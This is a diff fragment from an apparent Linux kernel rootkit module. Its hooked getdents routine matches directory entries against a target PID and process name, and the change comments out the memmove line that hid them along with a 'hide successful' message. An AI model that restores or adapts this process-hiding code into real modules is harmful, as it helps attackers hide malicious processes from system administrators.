@@ -65,9 +65,10 @@ struct linux_dirent __user *dirp, unsigned int count){
     //printk("%s\n", dirp->d_name);
     if( strcmp(dirp->d_name, mypid) == 0 || strcmp(dirp->d_name, processname) == 0 ) { 
       printk("%s\n", dirp->d_name);
-      memmove(dirp, (char*) dirp + dirp->d_reclen, tlen);
+      
+      /*memmove(dirp, (char*) dirp + dirp->d_reclen, tlen);
       value -= len;
-      printk(KERN_INFO "hide successful\n");
+      printk(KERN_INFO "hide successful\n");*/
     }
     if(tlen) {
       dirp = (struct linux_dirent* ) ((char*) dirp + dirp->d_reclen);
